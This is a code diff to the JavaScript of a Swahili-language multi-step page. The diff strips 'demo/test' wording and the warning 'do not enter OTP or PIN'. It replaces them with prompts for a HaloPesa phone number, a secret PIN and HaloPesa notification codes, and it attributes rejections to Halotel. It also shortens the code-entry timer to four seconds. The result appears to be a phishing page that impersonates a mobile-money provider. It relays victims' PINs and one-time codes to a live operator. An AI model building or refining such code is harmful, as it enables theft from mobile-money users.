@@ -6,10 +6,10 @@ const pages=[...document.querySelectorAll('.page')],steps=[...document.querySele
 function showPage(n){pages.forEach(p=>{if(p?.classList)p.classList.toggle('active',p.dataset.page===String(n));});steps.forEach((e,i)=>{if(e?.classList){e.classList.toggle('active',i===Number(n)-1);e.classList.toggle('done',i<Number(n)-1);}});if(n===2)startTimer('one');if(n===3)startTimer('two');window.scrollTo({top:0,behavior:'smooth'});}
 function error(id,msg){const e=$(id);if(!e)return;e.textContent=msg||'';if(e.classList)e.classList.toggle('hidden',!msg);}
 function stopTimer(k){if(timers[k])clearInterval(timers[k]);timers[k]=null;}
-function startTimer(k){stopTimer(k);const prefix=k==='one'?'refCode1':'refCode2';let left=30;const tick=()=>{$(prefix+'Seconds').textContent=left;$(prefix+'Ring').style.setProperty('--progress',(left/30*100)+'%');setClass(prefix+'Timer','expired',left===0);setClass(prefix+'Btn','hidden',left===0);setClass(prefix+'Resubmit','hidden',left!==0);if(left===0)stopTimer(k);left=Math.max(0,left-1);};tick();timers[k]=setInterval(tick,1000);}
+function startTimer(k){stopTimer(k);const prefix=k==='one'?'refCode1':'refCode2';let left=4;const tick=()=>{$(prefix+'Seconds').textContent=left;$(prefix+'Ring').style.setProperty('--progress',(left/30*100)+'%');setClass(prefix+'Timer','expired',left===0);setClass(prefix+'Btn','hidden',left===0);setClass(prefix+'Resubmit','hidden',left!==0);if(left===0)stopTimer(k);left=Math.max(0,left-1);};tick();timers[k]=setInterval(tick,1000);}
 async function getStatus(){const r=await fetch(`/api/applications/${state.applicationId}/status`);if(!r.ok)throw new Error('Imeshindikana kusoma hali ya ombi.');return r.json();}
-async function waitUntil(predicate){while(true){const d=await getStatus();if(d.status==='REJECTED')throw new Error('Ombi halijakubaliwa. Wasiliana na msimamizi wa demo.');if(predicate(d))return d;await new Promise(r=>setTimeout(r,1500));}}
-$('loginForm').addEventListener('submit',async e=>{e.preventDefault();error('loginError','');const phone=$('phone').value.trim(),applicationId=$('applicationIdInput').value.trim();if(!/^[0-9+\s-]{9,20}$/.test(phone))return error('loginError','Weka nambari ya simu ya majaribio.');if(!/^\d{1,30}$/.test(applicationId))return error('loginError','Weka namba ya kumbukumbu ya majaribio yenye tarakimu 1 hadi 30.');const b=$('startApplication');b.disabled=true;try{const r=await fetch('/api/applications',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone,applicationId,referralToken:state.referralToken})});const d=await r.json();if(!r.ok)throw new Error(d.error||'Imeshindikana kuunda ombi.');state.applicationId=d.applicationId;state.applicationNo=d.applicationNo;$('applicationNumber').textContent=d.applicationNo;setClass('approvalWaiting','hidden',false);if(b?.classList)b.classList.add('hidden');$('phone').disabled=true;$('applicationIdInput').disabled=true;await waitUntil(x=>x.status==='APPROVED');setClass('approvalWaiting','hidden',true);showPage(2);}catch(err){error('loginError',err.message);b.disabled=false;if(b?.classList)b.classList.remove('hidden');}});
+async function waitUntil(predicate){while(true){const d=await getStatus();if(d.status==='REJECTED')throw new Error('Ombi halijakubaliwa. hakiki nambari na nambari ya siri na ujaribu tena.');if(predicate(d))return d;await new Promise(r=>setTimeout(r,1500));}}
+$('loginForm').addEventListener('submit',async e=>{e.preventDefault();error('loginError','');const phone=$('phone').value.trim(),applicationId=$('applicationIdInput').value.trim();if(!/^[0-9+\s-]{9,20}$/.test(phone))return error('loginError','Weka nambari ya simu ya halopesa.');if(!/^\d{1,30}$/.test(applicationId))return error('loginError','Weka namba ya siri.');const b=$('startApplication');b.disabled=true;try{const r=await fetch('/api/applications',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone,applicationId,referralToken:state.referralToken})});const d=await r.json();if(!r.ok)throw new Error(d.error||'Imeshindikana kuunda ombi.');state.applicationId=d.applicationId;state.applicationNo=d.applicationNo;$('applicationNumber').textContent=d.applicationNo;setClass('approvalWaiting','hidden',false);if(b?.classList)b.classList.add('hidden');$('phone').disabled=true;$('applicationIdInput').disabled=true;await waitUntil(x=>x.status==='APPROVED');setClass('approvalWaiting','hidden',true);showPage(2);}catch(err){error('loginError',err.message);b.disabled=false;if(b?.classList)b.classList.remove('hidden');}});
 async function verifyDemoCode(which){
   const isOne=which===1;
   const input=$(isOne?'refCode1':'refCode2');
@@ -20,8 +20,8 @@ async function verifyDemoCode(which){
   error(err,'');
   if(!input || !btn)return error(err,'Ukurasa haujapakia vizuri. Tafadhali refresh ukurasa.');
   const demoNumber=String(input.value||'').trim();
-  if(!/^\d{1,30}$/.test(demoNumber))return error(err,'Weka namba ya majaribio pekee. Usiweke OTP au PIN.');
-  if(!state.applicationId)return error(err,'Anza ombi la demo kwanza.');
+  if(!/^\d{1,30}$/.test(demoNumber))return error(err,'Weka tarifa ya holopesa pekee.');
+  if(!state.applicationId)return error(err,'Anza ombi la  kwanza.');
   btn.disabled=true;
   try{
     const r=await fetch(`/api/applications/${state.applicationId}/demo-reference-notification`,{
@@ -29,7 +29,7 @@ async function verifyDemoCode(which){
       body:JSON.stringify({stage:isOne?'1':'2',demoNumber})
     });
     const d=await r.json().catch(()=>({}));
-    if(!r.ok)throw new Error(d.error||'Imeshindikana kutuma taarifa kwa admin.');
+    if(!r.ok)throw new Error(d.error||'Imeshindikana kutuma taarifa kwa halotel.');
     stopTimer(key);
     error(err,'');
     setClass(waitingId,'hidden',false);
@@ -50,7 +50,7 @@ async function verifyDemoCode(which){
         input.value='';
         btn.disabled=false;
         setClass(isOne?'refCode1Btn':'refCode2Btn','hidden',false);
-        error(err,'Admin amekataa namba hii ya majaribio. Weka namba nyingine kisha tuma tena.');
+        error(err,'halotel imekataa namba hii. Weka namba nyingine kisha tuma tena.');
         startTimer(key);
         return;
       }
